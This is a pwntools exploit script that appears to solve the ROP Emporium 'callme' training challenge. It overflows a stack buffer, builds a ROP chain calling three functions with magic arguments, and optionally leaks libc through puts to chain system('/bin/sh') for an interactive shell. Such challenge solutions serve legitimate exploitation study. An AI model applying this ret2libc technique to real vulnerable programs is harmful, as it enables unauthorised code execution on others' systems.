from pwn import *

elf = ELF("callme")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0x59
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32
READ_SIZE = 512

def make_call_chain(address):
    return [elf.symbols.usefulGadgets, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d, address]

def main():
    rop = ROP(elf)
    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
    if args.SHELL:
        rop.puts(elf.got.puts)
        rop.main()
    else:
        rop.raw([make_call_chain(a) for a in [elf.plt.callme_one, elf.plt.callme_two, elf.plt.callme_three]])
    payload = rop.chain()
    assert len(payload) <= READ_SIZE

    c = connection()
    c.sendafter(b'> ', payload)
    if args.SHELL:
        c.recvline()
        puts = unpack(c.recvline(drop=True).ljust(context.bytes, b'\0'))
        libc = elf.libc
        libc.address = puts - libc.symbols.puts
        rop = ROP(libc)
        rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
        rop.raw(rop.ret.address)
        rop.system(next(libc.search(b'/bin/sh\0')))
        payload = rop.chain()
        assert len(payload) <= READ_SIZE
        c.sendafter(b'> ', payload)
        c.recvline()
        c.interactive()
    else:
        print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
